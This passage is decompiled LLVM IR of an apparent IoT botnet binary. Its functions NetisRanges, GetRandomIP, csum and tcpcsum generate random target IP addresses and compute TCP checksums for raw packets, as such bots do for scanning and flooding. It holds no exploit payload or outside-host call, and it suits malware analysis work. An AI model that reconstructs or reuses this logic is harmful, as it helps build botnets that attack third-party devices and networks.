  %v4_804b6ab = call i32 @szprintf(i32 %v2_804b699, i32 ptrtoint ([14 x i8]* @global_var_8057ec1.150 to i32), i32 %v1_804b68a)
  br label %dec_label_pc_804b6b0

dec_label_pc_804b6b0:                             ; preds = %dec_label_pc_804b67a, %dec_label_pc_804b680
  %v10_804b6b0 = icmp eq i32 %v2_8049efa, 112
  %v1_804b6b4 = icmp eq i1 %v10_804b6b0, false
  br i1 %v1_804b6b4, label %dec_label_pc_804b6e6, label %dec_label_pc_804b6b6

dec_label_pc_804b6b6:                             ; preds = %dec_label_pc_804b6b0
  %v0_804b6b6 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b6b6 = zext i8 %v0_804b6b6 to i32
  store i32 %v1_804b6b6, i32* @edx, align 4
  %v0_804b6c0 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b6c0 = zext i8 %v0_804b6c0 to i32
  %v2_804b6cf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b6cf, i32* @ebx, align 4
  %v4_804b6e1 = call i32 @szprintf(i32 %v2_804b6cf, i32 ptrtoint ([14 x i8]* @global_var_8057ecf.151 to i32), i32 %v1_804b6c0)
  br label %dec_label_pc_804b6e6

dec_label_pc_804b6e6:                             ; preds = %dec_label_pc_804b6b0, %dec_label_pc_804b6b6
  %v13_804b6e6 = icmp eq i32 %v2_8049efa, 113
  %v1_804b6ea = icmp eq i1 %v13_804b6e6, false
  br i1 %v1_804b6ea, label %dec_label_pc_804b71c, label %dec_label_pc_804b6ec

dec_label_pc_804b6ec:                             ; preds = %dec_label_pc_804b6e6
  %v0_804b6ec = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b6ec = zext i8 %v0_804b6ec to i32
  store i32 %v1_804b6ec, i32* @edx, align 4
  %v0_804b6f6 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b6f6 = zext i8 %v0_804b6f6 to i32
  %v2_804b705 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b705, i32* @ebx, align 4
  %v4_804b717 = call i32 @szprintf(i32 %v2_804b705, i32 ptrtoint ([13 x i8]* @global_var_8057edd.152 to i32), i32 %v1_804b6f6)
  br label %dec_label_pc_804b71c

dec_label_pc_804b71c:                             ; preds = %dec_label_pc_804b6e6, %dec_label_pc_804b6ec
  %v13_804b71c = icmp eq i32 %v2_8049efa, 114
  %v1_804b720 = icmp eq i1 %v13_804b71c, false
  br i1 %v1_804b720, label %dec_label_pc_804b752, label %dec_label_pc_804b722

dec_label_pc_804b722:                             ; preds = %dec_label_pc_804b71c
  %v0_804b722 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b722 = zext i8 %v0_804b722 to i32
  store i32 %v1_804b722, i32* @edx, align 4
  %v0_804b72c = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b72c = zext i8 %v0_804b72c to i32
  %v2_804b73b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b73b, i32* @ebx, align 4
  %v4_804b74d = call i32 @szprintf(i32 %v2_804b73b, i32 ptrtoint ([14 x i8]* @global_var_8057eea.153 to i32), i32 %v1_804b72c)
  br label %dec_label_pc_804b752

dec_label_pc_804b752:                             ; preds = %dec_label_pc_804b71c, %dec_label_pc_804b722
  br i1 true, label %dec_label_pc_804b752.dec_label_pc_804b788_crit_edge, label %dec_label_pc_804b758

dec_label_pc_804b752.dec_label_pc_804b788_crit_edge: ; preds = %dec_label_pc_804b752
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_804b788

dec_label_pc_804b758:                             ; preds = %dec_label_pc_804b752
  br label %dec_label_pc_804b788

dec_label_pc_804b788:                             ; preds = %dec_label_pc_804b752.dec_label_pc_804b788_crit_edge, %dec_label_pc_804b758
  %v2_804b788.pre-phi = phi i32 [ %.pre, %dec_label_pc_804b752.dec_label_pc_804b788_crit_edge ], [ undef, %dec_label_pc_804b758 ]
  %v1_804b78e = call i32 @inet_addr(i32 %v2_804b788.pre-phi)
  %v2_804b796 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b796, i32* @ebx, align 4
  ret i32 %v1_804b78e

; uselistorder directives
  uselistorder i32 %v2_8049ecf, { 1, 0 }
  uselistorder i32 %v2_8049e8f, { 1, 0 }
  uselistorder i32 %v2_8049e4f, { 1, 0 }
  uselistorder i32 %v2_8049e0f, { 1, 0 }
  uselistorder i8* @global_var_806259a.41, { 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804b788, { 1, 0 }
  uselistorder label %dec_label_pc_804b752, { 1, 0 }
  uselistorder label %dec_label_pc_804b71c, { 1, 0 }
  uselistorder label %dec_label_pc_804b6e6, { 1, 0 }
  uselistorder label %dec_label_pc_804b6b0, { 1, 0 }
  uselistorder label %dec_label_pc_804b67a, { 1, 0 }
  uselistorder label %dec_label_pc_804b644, { 1, 0 }
  uselistorder label %dec_label_pc_804b60e, { 1, 0 }
  uselistorder label %dec_label_pc_804b5d8, { 1, 0 }
  uselistorder label %dec_label_pc_804b5a2, { 1, 0 }
  uselistorder label %dec_label_pc_804b56c, { 1, 0 }
  uselistorder label %dec_label_pc_804b536, { 1, 0 }
  uselistorder label %dec_label_pc_804b500, { 1, 0 }
  uselistorder label %dec_label_pc_804b4ca, { 1, 0 }
  uselistorder label %dec_label_pc_804b494, { 1, 0 }
  uselistorder label %dec_label_pc_804b45e, { 1, 0 }
  uselistorder label %dec_label_pc_804b428, { 1, 0 }
  uselistorder label %dec_label_pc_804b3f2, { 1, 0 }
  uselistorder label %dec_label_pc_804b3bc, { 1, 0 }
  uselistorder label %dec_label_pc_804b386, { 1, 0 }
  uselistorder label %dec_label_pc_804b350, { 1, 0 }
  uselistorder label %dec_label_pc_804b31a, { 1, 0 }
  uselistorder label %dec_label_pc_804b2e4, { 1, 0 }
  uselistorder label %dec_label_pc_804b2ae, { 1, 0 }
  uselistorder label %dec_label_pc_804b278, { 1, 0 }
  uselistorder label %dec_label_pc_804b242, { 1, 0 }
  uselistorder label %dec_label_pc_804b20c, { 1, 0 }
  uselistorder label %dec_label_pc_804b1d6, { 1, 0 }
  uselistorder label %dec_label_pc_804b1a0, { 1, 0 }
  uselistorder label %dec_label_pc_804b16a, { 1, 0 }
  uselistorder label %dec_label_pc_804b134, { 1, 0 }
  uselistorder label %dec_label_pc_804b0fe, { 1, 0 }
  uselistorder label %dec_label_pc_804b0c8, { 1, 0 }
  uselistorder label %dec_label_pc_804b092, { 1, 0 }
  uselistorder label %dec_label_pc_804b05c, { 1, 0 }
  uselistorder label %dec_label_pc_804b026, { 1, 0 }
  uselistorder label %dec_label_pc_804aff0, { 1, 0 }
  uselistorder label %dec_label_pc_804afba, { 1, 0 }
  uselistorder label %dec_label_pc_804af84, { 1, 0 }
  uselistorder label %dec_label_pc_804af4e, { 1, 0 }
  uselistorder label %dec_label_pc_804af18, { 1, 0 }
  uselistorder label %dec_label_pc_804aee2, { 1, 0 }
  uselistorder label %dec_label_pc_804aeac, { 1, 0 }
  uselistorder label %dec_label_pc_804ae76, { 1, 0 }
  uselistorder label %dec_label_pc_804ae40, { 1, 0 }
  uselistorder label %dec_label_pc_804ae0a, { 1, 0 }
  uselistorder label %dec_label_pc_804add4, { 1, 0 }
  uselistorder label %dec_label_pc_804ad9e, { 1, 0 }
  uselistorder label %dec_label_pc_804ad68, { 1, 0 }
  uselistorder label %dec_label_pc_804ad32, { 1, 0 }
  uselistorder label %dec_label_pc_804acfc, { 1, 0 }
  uselistorder label %dec_label_pc_804acc6, { 1, 0 }
  uselistorder label %dec_label_pc_804ac90, { 1, 0 }
  uselistorder label %dec_label_pc_804ac5a, { 1, 0 }
  uselistorder label %dec_label_pc_804ac24, { 1, 0 }
  uselistorder label %dec_label_pc_804abee, { 1, 0 }
  uselistorder label %dec_label_pc_804abb8, { 1, 0 }
  uselistorder label %dec_label_pc_804ab82, { 1, 0 }
  uselistorder label %dec_label_pc_804ab4c, { 1, 0 }
  uselistorder label %dec_label_pc_804ab16, { 1, 0 }
  uselistorder label %dec_label_pc_804aae0, { 1, 0 }
  uselistorder label %dec_label_pc_804aaaa, { 1, 0 }
  uselistorder label %dec_label_pc_804aa74, { 1, 0 }
  uselistorder label %dec_label_pc_804aa3e, { 1, 0 }
  uselistorder label %dec_label_pc_804aa08, { 1, 0 }
  uselistorder label %dec_label_pc_804a9d2, { 1, 0 }
  uselistorder label %dec_label_pc_804a99c, { 1, 0 }
  uselistorder label %dec_label_pc_804a966, { 1, 0 }
  uselistorder label %dec_label_pc_804a930, { 1, 0 }
  uselistorder label %dec_label_pc_804a8fa, { 1, 0 }
  uselistorder label %dec_label_pc_804a8c4, { 1, 0 }
  uselistorder label %dec_label_pc_804a88e, { 1, 0 }
  uselistorder label %dec_label_pc_804a858, { 1, 0 }
  uselistorder label %dec_label_pc_804a822, { 1, 0 }
  uselistorder label %dec_label_pc_804a7ec, { 1, 0 }
  uselistorder label %dec_label_pc_804a7b6, { 1, 0 }
  uselistorder label %dec_label_pc_804a780, { 1, 0 }
  uselistorder label %dec_label_pc_804a74a, { 1, 0 }
  uselistorder label %dec_label_pc_804a714, { 1, 0 }
  uselistorder label %dec_label_pc_804a6de, { 1, 0 }
  uselistorder label %dec_label_pc_804a6a8, { 1, 0 }
  uselistorder label %dec_label_pc_804a672, { 1, 0 }
  uselistorder label %dec_label_pc_804a63c, { 1, 0 }
  uselistorder label %dec_label_pc_804a606, { 1, 0 }
  uselistorder label %dec_label_pc_804a5d0, { 1, 0 }
  uselistorder label %dec_label_pc_804a59a, { 1, 0 }
  uselistorder label %dec_label_pc_804a564, { 1, 0 }
  uselistorder label %dec_label_pc_804a52e, { 1, 0 }
  uselistorder label %dec_label_pc_804a4f8, { 1, 0 }
  uselistorder label %dec_label_pc_804a4c2, { 1, 0 }
  uselistorder label %dec_label_pc_804a48c, { 1, 0 }
  uselistorder label %dec_label_pc_804a456, { 1, 0 }
  uselistorder label %dec_label_pc_804a420, { 1, 0 }
  uselistorder label %dec_label_pc_804a3ea, { 1, 0 }
  uselistorder label %dec_label_pc_804a3b4, { 1, 0 }
  uselistorder label %dec_label_pc_804a37e, { 1, 0 }
  uselistorder label %dec_label_pc_804a348, { 1, 0 }
  uselistorder label %dec_label_pc_804a312, { 1, 0 }
  uselistorder label %dec_label_pc_804a2dc, { 1, 0 }
  uselistorder label %dec_label_pc_804a2a6, { 1, 0 }
  uselistorder label %dec_label_pc_804a270, { 1, 0 }
  uselistorder label %dec_label_pc_804a23a, { 1, 0 }
  uselistorder label %dec_label_pc_804a204, { 1, 0 }
  uselistorder label %dec_label_pc_804a1ce, { 1, 0 }
  uselistorder label %dec_label_pc_804a198, { 1, 0 }
  uselistorder label %dec_label_pc_804a162, { 1, 0 }
  uselistorder label %dec_label_pc_804a12c, { 1, 0 }
  uselistorder label %dec_label_pc_804a0f6, { 1, 0 }
  uselistorder label %dec_label_pc_804a0c0, { 1, 0 }
  uselistorder label %dec_label_pc_804a08a, { 1, 0 }
  uselistorder label %dec_label_pc_804a054, { 1, 0 }
  uselistorder label %dec_label_pc_804a01e, { 1, 0 }
  uselistorder label %dec_label_pc_8049fe8, { 1, 0 }
  uselistorder label %dec_label_pc_8049fb2, { 1, 0 }
  uselistorder label %dec_label_pc_8049f7c, { 1, 0 }
  uselistorder label %dec_label_pc_8049f46, { 1, 0 }
}

define i32 @NetisRanges(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804b79e = load i32, i32* @ebx, align 4
  store i32 %v0_804b79e, i32* %stack_var_-16, align 4
  %v1_804b7a2 = call i32 @random()
  %v1_804b7a7 = urem i32 %v1_804b7a2, 16
  %v1_804b7b0 = mul nuw nsw i32 %v1_804b7a7, 4
  %v2_804b7b0 = add i32 %v1_804b7b0, ptrtoint (i32* @global_var_8062280.154 to i32)
  %v3_804b7b0 = inttoptr i32 %v2_804b7b0 to i32*
  %v4_804b7b0 = load i32, i32* %v3_804b7b0, align 4
  store i32 %v4_804b7b0, i32* @eax, align 4
  %v1_804b7b7 = trunc i32 %v4_804b7b0 to i8
  store i8 %v1_804b7b7, i8* @global_var_8062596.155, align 2
  %v1_804b7bc = call i32 @random()
  %v2_804b7de = sdiv i32 %v1_804b7bc, 51
  store i32 %v2_804b7de, i32* @ebx, align 4
  %tmp = mul i32 %v2_804b7de, -255
  %v2_804b7ee = add i32 %v1_804b7bc, %tmp
  %v14_804b7ee = trunc i32 %v2_804b7ee to i8
  store i32 %v2_804b7ee, i32* @eax, align 4
  store i8 %v14_804b7ee, i8* @global_var_8062597.38, align 1
  %v1_804b7fc = call i32 @random()
  %v2_804b81e = sdiv i32 %v1_804b7fc, 51
  store i32 %v2_804b81e, i32* @ebx, align 4
  %tmp24 = mul i32 %v2_804b81e, -255
  %v2_804b82e = add i32 %v1_804b7fc, %tmp24
  %v14_804b82e = trunc i32 %v2_804b82e to i8
  store i32 %v2_804b82e, i32* @eax, align 4
  store i8 %v14_804b82e, i8* @global_var_8062598.39, align 8
  %v1_804b83c = call i32 @random()
  %v2_804b85e = sdiv i32 %v1_804b83c, 51
  %tmp25 = mul i32 %v2_804b85e, -255
  %v2_804b86e = add i32 %v1_804b83c, %tmp25
  %v14_804b86e = trunc i32 %v2_804b86e to i8
  store i8 %v14_804b86e, i8* @global_var_8062599.40, align 1
  store i32 0, i32* %stack_var_-36, align 4
  %v1_804b898 = urem i32 %v2_804b86e, 256
  store i32 %v1_804b898, i32* @edx, align 4
  %v0_804b8ac = load i8, i8* @global_var_8062597.38, align 1
  %v1_804b8ac = zext i8 %v0_804b8ac to i32
  store i32 %v1_804b8ac, i32* @ebx, align 4
  %v0_804b8b6 = load i8, i8* @global_var_8062596.155, align 2
  %v1_804b8b6 = zext i8 %v0_804b8b6 to i32
  %v2_804b8c5 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_804b8c5, i32* @edi, align 4
  %v4_804b8df = call i32 @szprintf(i32 %v2_804b8c5, i32 ptrtoint ([12 x i8]* @global_var_8057ef8.156 to i32), i32 %v1_804b8b6)
  %v1_804b8ea = call i32 @inet_addr(i32 %v2_804b8c5)
  %v2_804b8f2 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804b8f2, i32* @ebx, align 4
  ret i32 %v1_804b8ea

; uselistorder directives
  uselistorder i32 %v2_804b86e, { 1, 0 }
  uselistorder i32 %v2_804b82e, { 1, 0 }
  uselistorder i32 %v2_804b7ee, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i8* @global_var_8062599.40, { 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_8062598.39, { 2, 1, 0 }
  uselistorder i8* @global_var_8062597.38, { 3, 2, 1, 0 }
  uselistorder i8* @global_var_8062596.155, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804b8f7 = load i32, i32* @ebp, align 4
  store i32 %v0_804b8f7, i32* %stack_var_-4, align 4
  %v0_804b8fd = load i32, i32* @global_var_8068808.157, align 8
  %v1_804b905 = call i32 @ntohl(i32 %v0_804b8fd)
  %v5_804b90a = and i32 %v1_804b905, %arg1
  %v1_804b910 = call i32 @rand_cmwc(i32 %v5_804b90a)
  %v1_804b91a = sub i32 -1, %arg1
  %v2_804b91c = and i32 %v1_804b910, %v1_804b91a
  %v5_804b91e = xor i32 %v2_804b91c, %v5_804b90a
  %v2_804b921 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b921, i32* @ebp, align 4
  ret i32 %v5_804b91e
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804b928 = load i32, i32* @ebx, align 4
  %v4_804b95733 = add i32 %arg2, -1
  %v9_804b95734 = sub i32 0, %arg2
  %v10_804b95735 = and i32 %arg2, %v9_804b95734
  %v11_804b95736 = icmp slt i32 %v10_804b95735, 0
  %v12_804b95737 = icmp eq i32 %v4_804b95733, 0
  %v13_804b95738 = icmp slt i32 %v4_804b95733, 0
  %v3_804b95b39 = icmp eq i1 %v13_804b95738, %v11_804b95736
  %v4_804b95b40 = icmp eq i1 %v12_804b95737, false
  %v5_804b95b41 = and i1 %v4_804b95b40, %v3_804b95b39
  br i1 %v5_804b95b41, label %dec_label_pc_804b93c, label %dec_label_pc_804b95d

dec_label_pc_804b93c:                             ; preds = %entry, %dec_label_pc_804b93c
  %stack_var_-24.045 = phi i16 [ %v9_804b94c, %dec_label_pc_804b93c ], [ 0, %entry ]
  %stack_var_8.044 = phi i32 [ %v4_804b953, %dec_label_pc_804b93c ], [ %arg2, %entry ]
  %stack_var_4.043 = phi i16* [ %v23_804b94f, %dec_label_pc_804b93c ], [ %arg1, %entry ]
  %v3_804b94942 = phi i32 [ %v6_804b949, %dec_label_pc_804b93c ], [ 0, %entry ]
  %v4_804b93c = ptrtoint i16* %stack_var_4.043 to i32
  %v2_804b93f = load i16, i16* %stack_var_4.043, align 2
  %v3_804b93f = zext i16 %v2_804b93f to i32
  %sext51 = mul i32 %v3_804b94942, 65536
  %v4_804b949 = sdiv i32 %sext51, 65536
  %v6_804b949 = add nsw i32 %v3_804b93f, %v4_804b949
  %v11_804b949 = icmp ult i32 %v6_804b949, %v4_804b949
  %v26_804b949 = trunc i32 %v6_804b949 to i16
  %v7_804b94c = zext i1 %v11_804b949 to i16
  %v9_804b94c = add i16 %v7_804b94c, %stack_var_-24.045
  %v5_804b94f = add i32 %v4_804b93c, 2
  %v23_804b94f = inttoptr i32 %v5_804b94f to i16*
  %v4_804b953 = add i32 %stack_var_8.044, -2
  %v4_804b957 = add i32 %stack_var_8.044, -3
  %v9_804b957 = sub i32 2, %stack_var_8.044
  %v10_804b957 = and i32 %v4_804b953, %v9_804b957
  %v11_804b957 = icmp slt i32 %v10_804b957, 0
  %v12_804b957 = icmp eq i32 %v4_804b957, 0
  %v13_804b957 = icmp slt i32 %v4_804b957, 0
  %v3_804b95b = icmp eq i1 %v13_804b957, %v11_804b957
  %v4_804b95b = icmp eq i1 %v12_804b957, false
  %v5_804b95b = and i1 %v4_804b95b, %v3_804b95b
  br i1 %v5_804b95b, label %dec_label_pc_804b93c, label %dec_label_pc_804b95d

dec_label_pc_804b95d:                             ; preds = %dec_label_pc_804b93c, %entry
  %v3_804b949.lcssa = phi i16 [ 0, %entry ], [ %v26_804b949, %dec_label_pc_804b93c ]
  %stack_var_4.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_804b94f, %dec_label_pc_804b93c ]
  %stack_var_8.0.lcssa = phi i32 [ %arg2, %entry ], [ %v4_804b953, %dec_label_pc_804b93c ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %entry ], [ %v9_804b94c, %dec_label_pc_804b93c ]
  %tmp18 = icmp slt i32 %stack_var_8.0.lcssa, 1
  br i1 %tmp18, label %dec_label_pc_804b99e.preheader, label %dec_label_pc_804b963

dec_label_pc_804b963:                             ; preds = %dec_label_pc_804b95d
  %v1_804b966 = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_804b966 = load i8, i8* %v1_804b966, align 1
  %v3_804b966 = zext i8 %v2_804b966 to i32
  %v4_804b971 = sext i16 %v3_804b949.lcssa to i32
  %v6_804b971 = add nsw i32 %v3_804b966, %v4_804b971
  %v11_804b971 = icmp ult i32 %v6_804b971, %v4_804b971
  %v26_804b971 = trunc i32 %v6_804b971 to i16
  %v7_804b974 = zext i1 %v11_804b971 to i16
  %v9_804b974 = add i16 %v7_804b974, %stack_var_-24.0.lcssa
  br label %dec_label_pc_804b99e.preheader

dec_label_pc_804b99e.preheader:                   ; preds = %dec_label_pc_804b963, %dec_label_pc_804b95d
  %v3_804b983.ph = phi i16 [ %v3_804b949.lcssa, %dec_label_pc_804b95d ], [ %v26_804b971, %dec_label_pc_804b963 ]
  %stack_var_-24.1.ph = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_804b95d ], [ %v9_804b974, %dec_label_pc_804b963 ]
  %v4_804b99e20 = sext i16 %v3_804b983.ph to i32
  %v4_804b9a121 = sext i16 %stack_var_-24.1.ph to i32
  %v3_804b9a422 = udiv i32 %v4_804b99e20, 65536
  %v4_804b9a423 = mul i32 %v4_804b9a121, 65536
  %v5_804b9a424 = or i32 %v4_804b9a423, %v3_804b9a422
  %v2_804b9a825 = udiv i32 %v4_804b9a121, 65536
  %v2_804b9ab26 = or i32 %v5_804b9a424, %v2_804b9a825
  %v3_804b9ab27 = icmp eq i32 %v2_804b9ab26, 0
  %v1_804b9af28 = icmp eq i1 %v3_804b9ab27, false
  br i1 %v1_804b9af28, label %dec_label_pc_804b979, label %dec_label_pc_804b9b1

dec_label_pc_804b979:                             ; preds = %dec_label_pc_804b99e.preheader, %dec_label_pc_804b979
  %v2_804b9a831 = phi i32 [ %v2_804b9a8, %dec_label_pc_804b979 ], [ %v2_804b9a825, %dec_label_pc_804b99e.preheader ]
  %v5_804b9a430 = phi i32 [ %v5_804b9a4, %dec_label_pc_804b979 ], [ %v5_804b9a424, %dec_label_pc_804b99e.preheader ]
  %v4_804b99e29 = phi i32 [ %v4_804b99e, %dec_label_pc_804b979 ], [ %v4_804b99e20, %dec_label_pc_804b99e.preheader ]
  %v2_804b994 = add i32 %v5_804b9a430, %v4_804b99e29
  %v7_804b994 = icmp ult i32 %v2_804b994, %v4_804b99e29
  %v3_804b996 = zext i1 %v7_804b994 to i32
  %v5_804b996 = add nuw nsw i32 %v3_804b996, %v2_804b9a831
  %sext = mul i32 %v2_804b994, 65536
  %v4_804b99e = sdiv i32 %sext, 65536
  %sext50 = mul i32 %v5_804b996, 65536
  %v4_804b9a1 = sdiv i32 %sext50, 65536
  %v3_804b9a4 = udiv i32 %v4_804b99e, 65536
  %v5_804b9a4 = or i32 %sext50, %v3_804b9a4
  %v2_804b9a8 = udiv i32 %v4_804b9a1, 65536
  %v2_804b9ab = or i32 %v5_804b9a4, %v2_804b9a8
  %v3_804b9ab = icmp eq i32 %v2_804b9ab, 0
  %v1_804b9af = icmp eq i1 %v3_804b9ab, false
  br i1 %v1_804b9af, label %dec_label_pc_804b979, label %dec_label_pc_804b99e.dec_label_pc_804b9b1_crit_edge

dec_label_pc_804b99e.dec_label_pc_804b9b1_crit_edge: ; preds = %dec_label_pc_804b979
  br label %dec_label_pc_804b9b1

dec_label_pc_804b9b1:                             ; preds = %dec_label_pc_804b99e.dec_label_pc_804b9b1_crit_edge, %dec_label_pc_804b99e.preheader
  %v4_804b99e.lcssa = phi i32 [ %v4_804b99e, %dec_label_pc_804b99e.dec_label_pc_804b9b1_crit_edge ], [ %v4_804b99e20, %dec_label_pc_804b99e.preheader ]
  %v1_804b9b5 = urem i32 %v4_804b99e.lcssa, 65536
  %v1_804b9b7 = xor i32 %v1_804b9b5, 65535
  store i32 %v0_804b928, i32* @ebx, align 4
  ret i32 %v1_804b9b7

; uselistorder directives
  uselistorder i32 %v5_804b9a4, { 1, 0 }
  uselistorder i32 %v4_804b99e, { 1, 0, 2 }
  uselistorder i32 %v2_804b9a825, { 1, 0 }
  uselistorder i32 %v4_804b9a121, { 1, 0 }
  uselistorder i32 %v4_804b99e20, { 2, 1, 0 }
  uselistorder i32 %v4_804b971, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i16 %v3_804b949.lcssa, { 1, 0 }
  uselistorder i32 %v4_804b957, { 1, 0 }
  uselistorder i32 %v4_804b953, { 0, 2, 1 }
  uselistorder i32 %v6_804b949, { 1, 2, 0 }
  uselistorder i32 %v4_804b949, { 1, 0 }
  uselistorder label %dec_label_pc_804b979, { 1, 0 }
  uselistorder label %dec_label_pc_804b93c, { 1, 0 }
}

define i32 @tcpcsum() local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804b9c2 = load i32, i32* @ebp, align 4
  store i32 %v0_804b9c2, i32* %stack_var_-4, align 4
  %v4_804b9c2 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804b9c2, i32* @ebp, align 4
  %v1_804b9d6 = add i32 %tmp10, 12
  %v2_804b9d6 = inttoptr i32 %v1_804b9d6 to i32*
  %v3_804b9d6 = load i32, i32* %v2_804b9d6, align 4
  %v1_804b9df = add i32 %tmp10, 16
  %v2_804b9df = inttoptr i32 %v1_804b9df to i32*
  %v3_804b9df = load i32, i32* %v2_804b9df, align 4
  %v2_804b9f4 = call i32 @htons(i16 20)
  %v1_804ba0d = call i32 @malloc(i32 32)
  store i32 %v1_804ba0d, i32* %ecx.global-to-local, align 4
  %v2_804ba1d = inttoptr i32 %v1_804ba0d to i32*
  store i32 %v3_804b9d6, i32* %v2_804ba1d, align 4
  %v1_804ba22 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804ba22 = add i32 %v1_804ba22, 4
  %v3_804ba22 = inttoptr i32 %v2_804ba22 to i32*
  store i32 %v3_804b9df, i32* %v3_804ba22, align 4
  %v1_804ba28 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804ba28 = add i32 %v1_804ba28, 8
  %v3_804ba28 = inttoptr i32 %v2_804ba28 to i32*
  store i32 0, i32* %v3_804ba28, align 4
  store i32 %tmp2, i32* %ecx.global-to-local, align 4
  %v1_804ba31 = add i32 %v1_804ba0d, 12
  store i32 %v1_804ba31, i32* %edx.global-to-local, align 4
  %v1_804ba34 = inttoptr i32 %tmp2 to i32*
  %v2_804ba34 = load i32, i32* %v1_804ba34, align 4
  %v2_804ba36 = inttoptr i32 %v1_804ba31 to i32*
  store i32 %v2_804ba34, i32* %v2_804ba36, align 4
  %v0_804ba38 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ba38 = add i32 %v0_804ba38, 4
  %v2_804ba38 = inttoptr i32 %v1_804ba38 to i32*
  %v3_804ba38 = load i32, i32* %v2_804ba38, align 4
  %v1_804ba3b = load i32, i32* %edx.global-to-local, align 4
  %v2_804ba3b = add i32 %v1_804ba3b, 4
  %v3_804ba3b = inttoptr i32 %v2_804ba3b to i32*
  store i32 %v3_804ba38, i32* %v3_804ba3b, align 4
  %v0_804ba3e = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ba3e = add i32 %v0_804ba3e, 8
  %v2_804ba3e = inttoptr i32 %v1_804ba3e to i32*
  %v3_804ba3e = load i32, i32* %v2_804ba3e, align 4
  %v1_804ba41 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ba41 = add i32 %v1_804ba41, 8
  %v3_804ba41 = inttoptr i32 %v2_804ba41 to i32*
  store i32 %v3_804ba3e, i32* %v3_804ba41, align 4
  %v0_804ba44 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ba44 = add i32 %v0_804ba44, 12
  %v2_804ba44 = inttoptr i32 %v1_804ba44 to i32*
  %v3_804ba44 = load i32, i32* %v2_804ba44, align 4
  %v1_804ba47 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ba47 = add i32 %v1_804ba47, 12
  %v3_804ba47 = inttoptr i32 %v2_804ba47 to i32*
  store i32 %v3_804ba44, i32* %v3_804ba47, align 4
  %v0_804ba4a = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ba4a = add i32 %v0_804ba4a, 16
  %v2_804ba4a = inttoptr i32 %v1_804ba4a to i32*
  %v3_804ba4a = load i32, i32* %v2_804ba4a, align 4
  %v1_804ba4d = load i32, i32* %edx.global-to-local, align 4
  %v2_804ba4d = add i32 %v1_804ba4d, 16
  %v3_804ba4d = inttoptr i32 %v2_804ba4d to i32*
  store i32 %v3_804ba4a, i32* %v3_804ba4d, align 4
  %v2_804ba5d = inttoptr i32 %v1_804ba0d to i16*
  %v3_804ba5d = call i32 @csum(i16* %v2_804ba5d, i32 32)
  %v1_804ba62 = urem i32 %v3_804ba5d, 65536
  %v1_804ba6f = call i32 @free(i32 %v1_804ba0d)
  %v2_804ba78 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ba78, i32* @ebp, align 4
  ret i32 %v1_804ba62

; uselistorder directives
  uselistorder i32 %v1_804ba0d, { 2, 1, 0, 3, 4 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
